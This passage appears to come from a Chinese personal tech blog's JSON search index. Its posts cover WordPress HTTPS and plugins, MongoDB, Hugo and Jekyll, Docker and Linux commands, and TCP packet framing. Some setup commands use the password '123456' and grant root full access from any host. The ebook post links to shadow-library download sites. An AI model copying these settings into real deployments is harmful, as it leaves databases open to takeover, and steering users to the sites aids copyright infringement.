ssl_certificate /etc/nginx/ssl/wordpress/1_www.httprun.com_bundle.crt;\n     ssl_certificate_key /etc/nginx/ssl/wordpress/2_www.httprun.com.key;\n     ssl_session_timeout 5m;\n     ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n     ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;\n     ssl_prefer_server_ciphers on;\n   \n     root   /var/www/wordpress/;\n   \n     location / {\n             index  index.html index.htm index.php;\n     }\n   \n     location ~ \\.php {\n             fastcgi_pass   127.0.0.1:9000;\n             fastcgi_index  index.php;\n             fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n             include        fastcgi_params;\n     }\n   }\n   ```\n\n   \n\n\n3. 进入WP后台，进入设置-常规 将WordPress地址（URL）、站点地址（URL）两项修改为：https。\n\n   ![1](wordpress配置技巧/1.png)\n\n\n4. 登录和后台强制开启SSL, 修改WP-config.php文件\n\n   ```bash\n   define('FORCE_SSL_LOGIN', true);\n   define('FORCE_SSL_ADMIN', true);\n   ```\n\n\n5. 修改数据库的历史 url\n\n   ```mysql\n   update wp_posts set post_content = replace(post_content, 'http://www.httprun.com','https://www.httprun.com');\n   ```\n\n\n\n# 3. 插件\n\n### 3.1 腾讯云cos\n\n+ https://cn.wordpress.org/plugins/tencentcloud-cos/\n\n### 3.2 备份网站\n\nupdraftplus 关键时刻会救命，会备份数据库，插件和主题等等。\n\n+ 恢复的时候sql datetime默认值问题\n\n```bash\n0000-00-00 00:00:00   修改为  0000-01-01 00:00:00\n```\n\n### 3.3 安全插件\n\nWordfence\n\n### 3.4 显示访问次数\n\nWP-PostViews\n\n\n\n# 4. 错误解决\n\n### 4.1 上传图片失败\n\n+ 最大上传限制\n\n  https://wordpress.org/plugins/upload-max-file-size/\n\n  看接口：wp-admin/async-upload.php，413 Request Entity Too Large，修改nginx 增加`client_max_body_size`。\n\n  ```nginx\n  server {\n    listen 443;\n    listen [::]:443;\n    .....\n    client_max_body_size 128m;\n    .....\n  }\n  ```\n\n+ 上传的文件大小超过php.ini文件中定义的upload_max_filesize值。\n\n  如果是 php-fpm 方式运行，启动php-fpm 通过参数 -c 指定配置文件即可。\n\n  ```bash\n  [Unit]\n  Description=The PHP FastCGI Process Manager\n  After=syslog.target network.target\n  \n  [Service]\n  Type=forking\n  PIDFile=/usr/local/php8/var/run/php-fpm.pid\n  ExecStart=/usr/local/php8/sbin/php-fpm -c /usr/local/php8/etc/php.ini\n  ExecReload=/bin/kill -USR2 $MAINPID\n  PrivateTmp=true\n  \n  [Install]\n  WantedBy=multi-user.target\n  ```\n\n  `vi /usr/local/php8/etc/php.ini`\n\n  ```php\n  upload_max_filesize = 512M\n  post_max_size = 512M\n  ```\n\n  \n\n+ 图像后期处理失败。可能服务器忙或没有足够的资源。请尝试上传较小的文件。推荐的最大尺寸为2500像素。\n\n  https://cn.wordpress.org/plugins/disable-big-image-threshold/\n\n# 5. 其他问题\n\n### 5.1 备案\n\n复制以下代码，备案号改成自己的。然后把代码放到后台->主题->主题编辑器的footer.php里面\n\n```html\n<div style=\"text-align: center\">\n\t<p style=\"float:center;height:20px;line-height:20px;margin: 10px 0px 10px 0px;color:#737373;\">Copyright @2021 版权所有\n\t\t<a target=\"_blank\" href=\"https://beian.miit.gov.cn/\" style=\"display:inline-block;text-decoration:none;height:20px;line-height:20px;\"> \n\t\t\t<img src=\"https://s1.ax1x.com/2020/07/02/NqYHbQ.png\" style=\"float:left;\"/>京ICP备xxxxx号\n\t\t</a>\n\t</p>\n</div>\n```\n\n### 5.2 更换域名\n\n+ 把域名的解析和证书先彻底换掉\n+ wp_options 这个数据表, 寻找 siteurl 和 home, 修改新域名。\n\n\n\n# 6. 参考资料\n\n+ https://www.wpcom.cn/tutorial/101.html\n\n+ https://ws234.com/344.html","tags":["wordpress"],"categories":["博客"]},{"title":"wordpress安装教程","url":"%2Fp%2Fd0d2b107.html","content":"\n\nWordPress是使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。也可以把 WordPress当作一个内容管理系统（CMS）来使用。\n\n<!-- more -->\n\n中文官网: https://cn.wordpress.org/\n\n# 1. 安装\n\n### 1.1 域名绑定\n\n首先有自己的域名和服务器, 我的域名是 `wordpress.httprun.com` 绑定到了我的服务器 IP\n\n![1](wordpress安装教程/1.png)\n\n### 1.2 安装 php\n\n参考:  https://www.liuvv.com/p/ad42ac48.html\n\n\n\n### 1.3 安装 mysql\n\n 因为使用的是 docker 安装, 所以后面的 ip 不是`localhost`  , 而是 `172.17.0.1`\n\n+ 安装 mysql \n\n  ```bash\n  docker pull mysql:5.7\n  \n  docker run -p 3306:3306 --name mysql-wordpress -v /opt/data/wordpress/conf:/etc/mysql -v \\\n  /opt/data/wordpress/data:/var/lib/mysql  -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7\n  ```\n\n+ 创建用户和数据库\n\n  ```mysql\n  docker exec -it mysql-wordpress bash\n  mysql -u root -p     //输入密码\n  \n  CREATE DATABASE wordpress;\n  CREATE USER 'wordpress'@'172.17.0.1' IDENTIFIED BY '123456';\n  GRANT ALL PRIVILEGES ON *.* TO 'wordpress'@'172.17.0.1' WITH GRANT OPTION;\n  FLUSH PRIVILEGES;\n  EXIT;\n  ```\n\n+ 本机可以连接docker的mysql\n\n  ```bash\n  mysql -h 172.17.0.1 -u wordpress -p\n  ```\n\n  \n\n### 1.4 配置wordpress\n\n+ 下载 wordpress\n\n  ```bash\n  wget https://wordpress.org/latest.tar.gz\n  tar -xzvf latest.tar.gz \n  \n  mv wordpress/ /var/www/\n  ```\n\n\n\n+ 修改 wordpress 的mysql 链接\n\n  ``` bash\n  cd /var/www/wordpress/\n  cp wp-config-sample.php wp-config.php\n  vi wp-config.php\n  # 修改的内容包括DB_NAME，DB_USER，DB_PASSWORD以及下面的唯一key\n  ```\n\n  ![1](wordpress安装教程/2.png)\n\n### 1.5 配置nginx\n\n```bash\ncd /etc/nginx/sites-enabled\nvi wordpress.conf\n```\n\n配置文件: \n```nginx\nserver {\n        listen       80;\n        server_name  wordpress.httprun.com;\n\n        root   /var/www/wordpress/;\n\n        location / {\n            index  index.html index.htm index.php;\n        }\n  \n        location ~ \\.php {\n                fastcgi_pass   127.0.0.1:9000;\n                fastcgi_index  index.php;\n                fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n                include        fastcgi_params;\n        }\n}\n```\n\n\n\n启动nginx\n\n```bash\n nginx -t\n nginx -s reload\n```\n\n另外要保证 php-fpm的启动,  参考安装 php\n\n\n### 1.6 安装wordpress\n\n打开域名+`/wp-admin/install.php`:   http://wordpress.httprun.com/wp-admin/install.php\n\n傻瓜式安装即可\n\n+ 安装图\n![1](wordpress安装教程/3.png)\n\n+ 后台\nhttp://wordpress.httprun.com/wp-admin/\n![1](wordpress安装教程/4.png)\n\n\n+ 前台\nhttp://wordpress.httprun.com\n![1](wordpress安装教程/5.png)\n\n\n\n# 2. 参考资料\n\n+ https://wordpress.org/support/article/how-to-install-wordpress/\n\n","tags":["wordpress"],"categories":["博客"]},{"title":"mongodb使用教程和高可用","url":"%2Fp%2Fd34774ef.html","content":"\n# 1. 操作\n\n### 1.1 数据库\n\n```sql\n# 创建数据库\nuse study\n\n# 查看当前在哪个数据库\n> db\nstudy\n\n# 删除数据库\ndb.dropDatabase()\n\n\n# 查看所有数据库\nshow dbs\n```\n\n<!-- more -->\n\n### 1.2 文档操作\n\n##### 1. 保存文档\n\n```sql\n# 向文档插入东西\ndb.test.insert({\"name\":\"test\"})\n\n\n# 保存东西\ndb.collection.save(\n   <document>,\n   {\n     writeConcern: <document>\n   }\n)\n  ● document : 文档数据。\n  ● writeConcern :可选，抛出异常的级别。\n\n以下实例中我们替换了 _id 为 56064f89ade2f21f36b03136 的文档数据： (通过指定id替换文档)\ndb.col.save({\n    \"_id\" : ObjectId(\"56064f89ade2f21f36b03136\"),\n    \"title\" : \"MongoDB\",\n    \"description\" : \"MongoDB 是一个 Nosql 数据库\",\n    \"tags\" : [\n            \"mongodb\",\n            \"NoSQL\"\n    ],\n    \"likes\" : 110\n})\n\n```\n\n+ insert: 若新增数据的主键已经存在，则会抛 org.springframework.dao.DuplicateKeyException 异常提示主键重复，不保存当前数据。\n\n+ save: 若新增数据的主键已经存在，则会对当前已经存在的数据进行修改操作。\n\n##### 2. 删除文档\n\n```sql\ndb.collection.remove(\n   <query>,\n   {\n     justOne: <boolean>,\n     writeConcern: <document>\n   }\n)\n  ● query :（可选）删除的文档的条件。\n  ● justOne : （可选）如果设为 true 或 1，则只删除一个文档。\n  ● writeConcern :（可选）抛出异常的级别。\n  \n\n# 删除文档\ndb.test.drop()\n```\n\n+ remove用于将集合中的文档删除，但不删除集合本身，也不删除集合的索引。\n+ drop不仅删除集合的文档，也会删除集合本身，同时也会删除在集合上创建的索引。\n\n##### 3. 文档查询\n\n如果你熟悉常规的 SQL 数据，通过下表可以更好的理解 MongoDB 的条件语句查询：\n\n```sql\n操作 格式 范例 RDBMS中的类似语句\n等于 {<key>:<value>} db.col.find({\"by\":\"菜鸟教程\"}).pretty() where by = '菜鸟教程'\n小于 {<key>:{$lt:<value>}} db.col.find({\"likes\":{$lt:50}}).pretty() where likes < 50\n小于或等于 {<key>:{$lte:<value>}} db.col.find({\"likes\":{$lte:50}}).pretty() where likes <= 50\n大于 {<key>:{$gt:<value>}} db.col.find({\"likes\":{$gt:50}}).pretty() where likes > 50\n大于或等于 {<key>:{$gte:<value>}} db.col.find({\"likes\":{$gte:50}}).pretty() where likes >= 50\n不等于 {<key>:{$ne:<value>}} db.col.find({\"likes\":{$ne:50}}).pretty() where likes != 50\n```\n\n+ MongoDB AND 条件\n  MongoDB 的 find() 方法可以传入多个键(key)，每个键(key)以逗号隔开，及常规 SQL 的 AND 条件。\n  语法格式如下：\n\n```sql\n>db.col.find({key1:value1, key2:value2}).pretty()\n```\n\n+ MongoDB OR 条件\n  MongoDB OR 条件语句使用了关键字 $or,语法格式如下：\n\n```sql\n>db.col.find(\n   {\n      $or: [\n\t     {key1: value1}, {key2:value2}\n      ]\n   }\n).pretty()\n```\n\n+ AND 和 OR 联合使用\n  以下实例演示了 AND 和 OR 联合使用，类似常规 SQL 语句为： 'where likes>50 AND (by = '菜鸟教程' OR title = 'MongoDB 教程')'\n\n```sql\n>db.col.find({\"likes\": {$gt:50}, $or: [{\"by\": \"菜鸟教程\"},{\"title\": \"MongoDB 教程\"}]}).pretty()\n```\n\n##### 4. **更新文档**\n\n```sql\ndb.collection.update(\n   <query>,\n   <update>,\n   {\n     upsert: <boolean>,\n     multi: <boolean>,\n     writeConcern: <document>\n   }\n)\n\n参数说明：\n  ● query : update的查询条件，类似sql update查询内where后面的。\n  ● update : update的对象和一些更新的操作符（如$,$inc...）等，也可以理解为sql update查询内set后面的\n  ● upsert : 可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。\n  ● multi : 可选，mongodb 默认是false,只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。\n  ● writeConcern :可选，抛出异常的级别\n```\n\n例子:\n\n```sql\ndb.col.insert({\n    title: 'MongoDB 教程', \n    description: 'MongoDB 是一个 Nosql 数据库',\n    tags: ['mongodb', 'database', 'NoSQL'],\n    likes: 100\n})\n\ndb.col.update({'title':'MongoDB 教程'},{$set:{'title':'MongoDB'}})\ndb.col.update({'title':'MongoDB 教程'},{$set:{'title':'MongoDB'}},{multi:true})\n```\n\n更多实例:\n\n```sql\n只更新第一条记录：\ndb.col.update( { \"count\" : { $gt : 1 } } , { $set : { \"test2\" : \"OK\"} } );\n全部更新：\ndb.col.update( { \"count\" : { $gt : 3 } } , { $set : { \"test2\" : \"OK\"} },false,true );\n只添加第一条：\ndb.col.update( { \"count\" : { $gt : 4 } } , { $set : { \"test5\" : \"OK\"} },true,false );\n全部添加加进去:\ndb.col.update( { \"count\" : { $gt : 5 } } , { $set : { \"test5\" : \"OK\"} },true,true );\n全部更新：\ndb.col.update( { \"count\" : { $gt : 15 } } , { $inc : { \"count\" : 1} },false,true );\n只更新第一条记录：\ndb.col.update( { \"count\" : { $gt : 10 } } , { $inc : { \"count\" : 1} },false,false );\n```\n\n\n\n# 2. 介绍\n\nMongoDB 是一个基于 分布式文件存储 的开源 NoSQL 数据库系统，由 C++ 编写的。MongoDB 支持分片集群，可以很方便地添加更多的节点（实例），让集群存储更多的数据，具备更强的性能。\n\n### 2.1 存储结构\n\nMongoDB 的存储结构区别于传统的关系型数据库，主要由如下三个单元组成：\n\n- 文档（Document）：MongoDB 中最基本的单元，由 BSON 键值对（key-value）组成，类似于关系型数据库中的行（Row）。\n- 集合（Collection）：一个集合可以包含多个文档，类似于关系型数据库中的表（Table）。\n- 数据库（Database）：一个数据库中可以包含多个集合，可以在 MongoDB 中创建多个数据库，类似于关系型数据库中的数据库（Database）。\n\n### 2.2 特点\n\n- **数据记录被存储为文档**：MongoDB 中的记录就是一个 BSON 文档，它是由键值对组成的数据结构，类似于 JSON 对象，是 MongoDB 中的基本数据单元。\n- **模式自由**：集合的概念类似 MySQL 里的表，但它不需要定义任何模式，能够用更少的数据对象表现复杂的领域模型对象。\n- **支持多种查询方式**：MongoDB 查询 API 支持读写操作 (CRUD)以及数据聚合、文本搜索和地理空间查询。\n- **支持 ACID 事务**：与关系型数据库一样，MongoDB 事务同样具有 ACID 特性。MongoDB 单文档原生支持原子性，也具备事务的特性。MongoDB 4.0 加入了对多文档事务的支持，但只支持复制集部署模式下的事务，也就是说事务的作用域限制为一个副本集内。MongoDB 4.2 引入了分布式事务，增加了对分片集群上多文档事务的支持，并合并了对副本集上多文档事务的现有支持。\n\n- **高效的二进制存储**：存储在集合中的文档，是以键值对的形式存在的。键用于唯一标识一个文档，一般是 ObjectId 类型，值是以 BSON 形式存在的。BSON = Binary JSON， 是在 JSON 基础上加了一些类型及元数据描述的格式。\n- **自带数据压缩功能**：存储同样的数据所需的资源更少。\n- **支持 mapreduce**：通过分治的方式完成复杂的聚合任务。不过，从 MongoDB 5.0 开始，map-reduce 已经不被官方推荐使用了，替代方案是 [聚合管道](https://www.mongodb.com/docs/manual/core/aggregation-pipeline/)。聚合管道提供比 map-reduce 更好的性能和可用性。\n\n- **支持多种类型的索引**：MongoDB 支持多种类型的索引，包括单字段索引、复合索引、多键索引、哈希索引、文本索引、 地理位置索引等，每种类型的索引有不同的使用场合。\n- **支持 failover**：提供自动故障恢复的功能，主节点发生故障时，自动从从节点中选举出一个新的主节点，确保集群的正常使用，这对于客户端来说是无感知的。\n- **支持分片集群**：MongoDB 支持集群自动切分数据，让集群存储更多的数据，具备更强的性能。在数据插入和更新时，能够自动路由和存储。\n- **支持存储大文件**：MongoDB 的单文档存储空间要求不超过 16MB。对于超过 16MB 的大文件，MongoDB 提供了 GridFS 来进行存储，通过 GridFS，可以将大型数据进行分块处理，然后将这些切分后的小文档保存在数据库中。\n\n# 3. 高可用\n\n### 3.1 副本集群（复制）\n\nMongoDB 的副本集群是一组维护相同数据集合的 mongod 进程。\n\n客户端连接到整个 Mongodb 复制集群，主节点机负责整个复制集群的写，从节点可以进行读操作，但默认还是主节点负责整个复制集群的读。主节点发生故障时，自动从从节点中选举出一个新的主节点，确保集群的正常使用，这对于客户端来说是无感知的。\n\n通常来说，一个复制集群包含 1 个主节点（Primary），多个从节点（Secondary）以及零个或 1 个仲裁节点（Arbiter）。\n\n- **主节点**：整个集群的写操作入口，接收所有的写操作，并将集合所有的变化记录到操作日志中，即 oplog。主节点挂掉之后会自动选出新的主节点。\n- **从节点**：从主节点同步数据，在主节点挂掉之后选举新节点。不过，从节点可以配置成 0 优先级，阻止它在选举中成为主节点。\n- **仲裁节点**：这个是为了节约资源或者多机房容灾用，只负责主节点选举时投票不存数据，保证能有节点获得多数赞成票。\n\n### 3.2 分片集群（分区）\n\n分片集群是 MongoDB 的分布式版本，相较副本集，分片集群数据被均衡的分布在不同分片中， 不仅大幅提升了整个集群的数据容量上限，也将读写的压力分散到不同分片，以解决副本集性能瓶颈的难题。\n\n类似于 Redis Cluster，MongoDB 也可以通过分片实现 水平扩展 。水平扩展这种方式更灵活，可以满足更大数据量的存储需求，支持更高吞吐量。并且，水平扩展所需的整体成本更低，仅仅需要相对较低配置的单机服务器即可，代价是增加了部署的基础设施和维护的复杂性。\n\n##### 1. 分片策略\n\n+ 基于范围的分片\n\n  MongoDB 按照分片键（Shard Key）的值的范围将数据拆分为不同的块（Chunk），每个块包含了一段范围内的数据。当分片键的基数大、频率低且值非单调变更时，范围分片更高效。\n\n+ 基于 Hash 值的分片\n\n  MongoDB 计算单个字段的哈希值作为索引值，并以哈希值的范围将数据拆分为不同的块（Chunk）。\n\n##### 2. 分片数据如何存储？\n\n默认情况下，一个 Chunk 的最大值默认为 64MB（可调整，取值范围为 1~1024 MB。如无特殊需求，建议保持默认值），进行数据插入、更新、删除时，如果此时 Mongos 感知到了目标 Chunk 的大小或者其中的数据量超过上限，则会触发 Chunk 分裂。\n\n随着数据插入，导致 Chunk 分裂，让 AB 两个分片有 3 个 Chunk，C 分片只有一个，这个时候就会把 B 分配的迁移一个到 C 分片实现集群数据均衡。\n\n# 4. 头脑风暴\n\n### 4.1 是b树还是b+树\n\n`MongoDB indexes use a B-tree data structure.`\n\n有人看到官方文档中的这么一句，就以为 MongoDB 底层使用的是狭义上的 B 树。但实际上 MongoDB 底层用的是 B+ 树，文档中 B-tree 应该理解为广义上的 B 树。\n\nMongoDB 从 3.2 开始就默认使用 WiredTiger 作为存储引擎，所以 MongoDB 内部存储的数据结构由 WiredTiger 决定。而 WiredTiger 官方文档明确说了底层用的 B+ 树。\n\n\n\n# 5. 参考文档\n\n+ https://zhuanlan.zhihu.com/p/519658576","tags":["sql"],"categories":["数据库"]},{"title":"电子书下载和阅读方式","url":"%2Fp%2F43c75d15.html","content":"\n书籍是人类进步的阶梯，有些书通过电子书来阅读更方便。\n\n<!-- more -->\n\n# 1. 书籍下载\n\n### 1.1 Z-Library\n\n+ https://singlelogin.me （去找电报机器人）\n\n### 1.2 创世纪图书馆\n\nhttp://libgen.is/\n\n### 1.3 其他\n\n+ https://www.book123.info/ 无名图书\n\n- https://www.ershu.org/ 尔书网\n- https://www.zhishikoo.com/ 知识库\n- https://www.jiumodiary.com/ 鸠摩搜索\n- https://lorefree.com/ 去中心化知识共享社区\n\n\n\n# 2. 读书软件\n\n### 2.1 ios \n\n+ 多看阅读\n\n​\t有时候书架本地书点不动，需要开下流量（不要挂代理），再点。\n\n### 2.2 mac \n\n+ ~~ClearviewX~~\n\n+ ~~ebook-viewer/calibre自带。~~\n\n<img src=\"%E7%94%B5%E5%AD%90%E4%B9%A6%E4%B8%8B%E8%BD%BD%E5%92%8C%E9%98%85%E8%AF%BB%E6%96%B9%E5%BC%8F/1.jpg\" alt=\"1\" style=\"zoom:50%;\" />\n<img src=\"%E7%94%B5%E5%AD%90%E4%B9%A6%E4%B8%8B%E8%BD%BD%E5%92%8C%E9%98%85%E8%AF%BB%E6%96%B9%E5%BC%8F/2.jpg\" alt=\"2\" style=\"zoom:50%;\" />\n<img src=\"%E7%94%B5%E5%AD%90%E4%B9%A6%E4%B8%8B%E8%BD%BD%E5%92%8C%E9%98%85%E8%AF%BB%E6%96%B9%E5%BC%8F/3.jpg\" alt=\"3\" style=\"zoom:50%;\" />\n\n+ 微信读书\n\n\n\n# 3. 格式\n\n### 3.1 pdf\n\nPDF(Portable Document Format)是最常见的电子书格式之一。它由Adobe主导。用于PDF创建和排版的软件非常专业和实用。 PDF格式的电子书很容易在网络上找到。许多学术资料仅采用PDF格式，几乎所有平台都支持读取PDF文件。\n\n优点：提供最好的排版效果、从创建到浏览都有一大批软硬件提供支持\n缺点：在小屏上体验不佳，需要频繁缩放拖动（保证文档高还原度的代偿）\n\n\n\n### 3.2 epub\n\nepub格式电子书最大的特点就是通用性强，是目前支持阅读软件最多的电子书（比如浏览器、基本除了Kindle APP以外的所有阅读APP都支持）。\n\n除此之外，epub 格式对于复杂的排版，图表，公式等元素的兼容性比mobi格式要好。目前epub格式的优势主要体现在图文混排、图片嵌入字体上，未来可预测的优势是epub格式将会支持声音、影像等多媒体内容（来自维基百科）。\n\n优点：体积相对pdf要小；对阅读设备的性能要求较低；对小屏设备友好\n缺点：无明显缺点\n\n\n\n### 3.3 mobi\n\n mobi是Amazon电子书的专有格式，mobi跟epub表现无限接近。\n\n\n\n### 3.4 azw3\n\n目前从 Amazon购买的书，大部分已经是azw3格式了，而以前主流的mobi格式则越来越少，它正逐渐取代mobi成为Kindle电子书的主流格式。\n\nazw格式是Amazon的专有格式，因此它在电子阅读器中不像EPUB和MOBI格式那样得到广泛支持。所有Amazon Kindle产品都可以读取azw格式，但是您无法在其他流行的设备（例如Nook和Kobo电子阅读器）中读取azw格式。 azw文件可以存储复杂的内容，例如书签，注释和突出显示。\n\n\n\n# 4. 参考资料\n\n+ https://he.coffee/ebooks/ebook-format/\n\n","tags":["电子书"],"categories":["读书"]},{"title":"jekyll搭建博客","url":"%2Fp%2F139d19f4.html","content":"\n# 1. 安装使用\n\n```bash\nsudo gem install jekyll\n```\n\n本来以为`jekyll`是最简单部署的, 实践发现, 一点也没少折腾. \n\n<!-- more -->\n\n### 1.1 报错\n\n+ requires ruby version >= 2.4.0.\n\n  ```bash\n  brew reinstall ruby\n  echo 'export PATH=\"/usr/local/opt/ruby/bin:$PATH\"' >> ~/.zshrc\n  ```\n\n+ Jekyll - command not found\n\n  ```\n  sudo gem install -n /usr/local/bin jekyll\n  ```\n\n  \n\n### 1.2 新建 blog\n\n```bash\njekyll new myblog\ncd myblog\njekyll serve # 启动 server\n```\n\n\n\n# 2. 使用\n\n### 2.1 简单修改主页\n\n在 github 创建好 githubpage\n\n```bash\ngit clone git@github.com:unix2dos/httprun.git\ngit checkout gh-pages\n```\n\n\n修改 index.md 即可\n\n\n\n# 3. 参考资料\n\n+ https://jekyllcn.com/docs/quickstart/","tags":["jekyll"],"categories":["博客"]},{"title":"hugo搭建博客","url":"%2Fp%2F74f76184.html","content":"\n博客之前是用 hexo 来搭建的, 问为什么要转移到 hugo, 就是一个字: 太慢.\n\n但是除了快,  hexo 好多牛逼的插件, hugo 目前还没有, 然后模板也比较丑.\n\n<!-- more -->\n\n# 1. 安装和配置\n\n### 1.1 安装Hugo\n\n```bash\n# 安装 hugo\nbrew install hugo\n\n# 创建项目\nhugo new site hugo-demo && cd hugo-demo \n\n# 设置主题\ngit init\ngit submodule add https://github.com/budparr/gohugo-theme-ananke.git themes/\necho 'theme = \"ananke\"' >> config.toml \n\n# 新建文章\nhugo new posts/my-first-post.md\n\n# 启动 server 预览\nhugo server\n```\n\n在浏览器输入 `http://localhost:1313` 即可查看效果\n\n使用如下代码部署编译完成的静态页面文件：\n\n```bash\nhugo -D\n```\n\n### 1.2 腾讯云静态部署\n\n> https://cloud.tencent.com/document/product/1210/43389\n\n```bash\nnpm install -g @cloudbase/cli\ntcb login\n\n# 您还没有开启静态网站服务，请先到云开发控制台开启静态网站服务！\n#👉 https://console.cloud.tencent.com/tcb\n\ncloudbase hosting deploy ./public  -e EnvID -r bj # 此处的 EnvID 替换为腾讯云CloudBase环境 ID, -r bj 是北京\n```\n\n\n\n# 2. 主题even\n\n```bash\ngit submodule add https://github.com/olOwOlo/hugo-theme-even.git themes/even\n\n\n# Take a look inside the exampleSite folder of this theme. You'll find a file called config.toml. To use it, copy the config.toml in the root folder of your Hugo site. Feel free to change it.\ncp themes/even/exampleSite/config.toml ./\n\n\n#  For this theme, you should use post instead of posts, namely hugo new post/some-content.md\nmv  content/posts/   content/post/\n```\n\n\n\n### 2.1 图片相对路径\n\nconfig.toml 设置\n\n```ini\nuglyurls = true\n```\n\n如果不行, 再设置环境变量\n\n```bash\nexport HUGO_UGLYURLS=true\n```\n\n### 2.2 评论\n\nconfig.toml 设置 valine 的 id\n\n```ini\nparams.valine\n```\n\n### 2.3 唯一地址\n\nTODO: 没有找到`hexo-abbrlink`类似的插件, 为了和以前的地址兼容, 还是一件麻烦的事情.\n\n### 2.4 本地搜索\n\nTODO: 没找到简单的方案\n\n\n\n# 3. 错误\n\n### 3.1  tags 语法问题\n\nexecuting \"_internal/schema.html\" at <.Params.tags>: range can't iterate over mongodb\n\ntags: mongodb  这样就会导致 `tags` 不能迭代，需要改成 `tags: [mongodb]` 才能解决这个 Bug。\n\n\n\n\n# 4. 参考资料\n\n+ https://cloud.tencent.com/document/product/1210/43389\n+ https://blog.lxdlam.com/post/9cc3283b/\n\n","tags":["hugo"],"categories":["博客"]},{"title":"常用docker快速启动命令","url":"%2Fp%2F4aa4f44c.html","content":"\n# 1. mysql\n\n### 1.1 启动5.7版本\n\n```bash\ndocker pull mysql:5.7\ndocker run -p 3306:3306 --name mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7\n```\n\n<!-- more -->\n\n### 1.2 启动最新版本\n\n```bash\ndocker pull mysql:latest   \ndocker run -p 3307:3306 --name mysql_latest -e MYSQL_ROOT_PASSWORD=123456 -d mysql:latest\n```\n\n看最新版本对应的版本号:\n\n``` bash\ndocker run --rm mysql:latest mysql -V\n```\n\n\n\n### 1.3 允许外网连接\n\n```bash\ndocker exec -it mysql  /bin/bash\nmysql -u root -p\n\nALTER USER 'root'@'%' IDENTIFIED WITH mysql_native_password BY '12345678';\nGRANT ALL PRIVILEGES ON *.* TO 'root'@'%'  WITH GRANT OPTION;\nflush privileges;\n```\n\n\n\n# 2. redis\n\n### 2.1 启动最新版本\n\n```bash\ndocker pull redis:latest\ndocker run -d --name redis -p 6379:6379 redis:latest  --requirepass \"123456\"\n```\n\n看最新版本对应的版本号:\n\n```bash\ndocker run --rm redis:latest redis-cli -v\n```\n\n\n\n\n\n\n\n\n\n\n\n","tags":["docker"],"categories":["docker"]},{"title":"linux常见解决方案","url":"%2Fp%2F182cebe4.html","content":"\n记录一些 linux 常见的问题解决方案.\n\n### 1. 用户加到 sudo 用户组\n\n```bash\nvi /etc/sudoers\n\n# 可以看到有个 sudo 用户组\n# %sudo   ALL=(ALL:ALL) ALL\n```\n\n<!-- more -->\n\n添加到 sudo组\n\n```bash\nusermod -aG sudo <username>\n```\n\n可以看到, sudo 组有这个用户了\n\n```bash\nvi /etc/group \n```\n\n\n\n### 2. 快速拷贝公钥到服务器\n\n```bash\nssh-copy-id -i ~/.ssh/fhyx.pub   liuwei@49.234.15.70\n```\n\n\n\n### 3. ssh config目录权限\n\nBad owner or permissions on .ssh/config的解决方案\n\n```bash\nchmod 600 ~/.ssh/config\nchown $USER ~/.ssh/config\n```\n\n\n\n### 4. 清理磁盘\n\n```bash\nsudo df -h #查看服务器空间  \n\nsudo du -h --max-depth=1      #这个命令用于查看当前目录，哪个文件占用最大  \nsudo du -h --max-depth=1 | sort -nr   # 排序\nsudo du -sh *  #查看当前目录下各文件及文件夹占用大小  \n```\n\n","tags":["linux"],"categories":["命令"]},{"title":"tcp粘包问题和Nagle算法","url":"%2Fp%2F6d39ef4c.html","content":"\n# 1. TCP 粘包\n\n粘包并不是 TCP 协议造成的，它的出现是因为应用层协议设计者对 TCP 协议的错误理解，忽略了 TCP 协议的定义并且缺乏设计应用层协议的经验。我们经常提到的 TCP 协议中的粘包是如何发生的：\n\n- TCP 协议是面向字节流的协议，它可能会组合或者拆分应用层协议的数据；\n- 应用层协议的没有定义消息的边界导致数据的接收方无法拼接数据；\n\nTCP本来就是基于字节流而不是消息包的协议，会把你的数据变成字节流发到对面去，而且保证顺序不会乱，但是你要自己搞定字节流解析。\n\n<!-- more -->\n\n# 2. 粘包问题如何处理？\n\n粘包问题的本质就是无法区分数据包的边界，只要解决了这个问题，也就解决了粘包问题。\n\n### 2.1 关闭Nagle算法\n\nNagle 算法确实能够在数据包较小时提高网络带宽的利用率并减少 TCP 和 IP 协议头带来的额外开销，但是使用该算法也可能会导致应用层协议多次写入的数据被合并或者拆分发送，当接收方从 TCP 协议栈中读取数据时会发现不相关的数据出现在了同一个数据段中，应用层协议可能没有办法对它们进行拆分和重组。\n\nNagle算法问题导致的，需要结合应用场景适当关闭该算法。\n\n### 2.2 消息边界\n\n如果我们能在应用层协议中定义消息的边界，那么无论 TCP 协议如何对应用层协议的数据包进程拆分和重组，接收方都能根据协议的规则恢复对应的消息。在应用层协议中，最常见的两种解决方案就是\n\n+ 基于长度\n\n  基于长度的实现有两种方式，一种是使用固定长度，所有的应用层消息都使用统一的大小，另一种方式是使用不固定长度，但是需要在应用层协议的协议头中增加表示负载长度的字段，这样接收方才可以从字节流中分离出不同的消息，HTTP 协议的消息边界就是基于长度实现的。\n\n  在上述 HTTP 消息中，我们使用 Content-Length 头表示 HTTP 消息的负载大小，当应用层协议解析到足够的字节数后，就能从中分离出完整的 HTTP 消息，无论发送方如何处理对应的数据包，我们都可以遵循这一规则完成 HTTP 消息的重组。\n\n+ 基于终结符（Delimiter）\n\n  不过 HTTP 协议除了使用基于长度的方式实现边界，也会使用基于终结符的策略，当 HTTP 使用块传输（Chunked Transfer）机制时，HTTP 头中就不再包含 Content-Length 了，它会使用负载大小为 0 的 HTTP 消息作为终结符表示消息的边界。\n\n  还有例如\\n，\\r，\\t，或者一些隐藏字符。\n\n当然除了这两种方式之外，我们可以基于特定的规则实现消息的边界，例如：使用 TCP 协议发送 JSON 数据，接收方可以根据接收到的数据是否能够被解析成合法的 JSON 判断消息是否终结。\n\n\n\n# 3. Nagle算法和延迟确认\n\n### 3.1 